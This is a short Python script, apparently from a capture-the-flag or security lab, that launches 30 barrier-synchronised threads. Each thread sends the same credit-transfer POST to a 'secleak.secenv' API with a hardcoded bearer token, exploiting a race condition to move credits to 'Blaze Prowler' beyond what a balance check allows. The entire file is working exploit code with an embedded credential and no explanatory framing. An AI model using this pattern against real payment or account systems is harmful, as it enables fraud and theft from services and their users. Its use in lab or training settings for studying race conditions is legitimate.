import requests
import concurrent.futures
import threading

JWT = "	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NDc0ODk2MjgsIm5iZiI6MTc0NzQ4OTYyOCwianRpIjoiZjBjMDJmZWMtZTE5ZC00Yjk3LWEwZTktYTg2NTFiM2E0MmM1IiwiaWRlbnRpdHkiOnsidWlkIjo0MzksIm5pY2siOiJNci4gU2hvcnQifSwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.M-DT0gHNm66-B4eYNjW3G42vrPId7rStTUJm5BWA1hA"
url = "http://secleak.secenv/api/credit"
headers = {
    "Authorization": f"Bearer {JWT}",
    "Content-Type": "application/json"
}
data = {
    "receiver": "Blaze Prowler",
    "amount": "10"
}

NUM_THREADS = 30
barrier = threading.Barrier(NUM_THREADS)

def transfer():
    try:
        barrier.wait()
        r = requests.post(url, headers=headers, json=data)
        print(r.status_code, r.text)
    except Exception as e:
        print("Error:", e)

threads = [threading.Thread(target=transfer) for _ in range(NUM_THREADS)]

for t in threads:
    t.start()
for t in threads:
    t.join()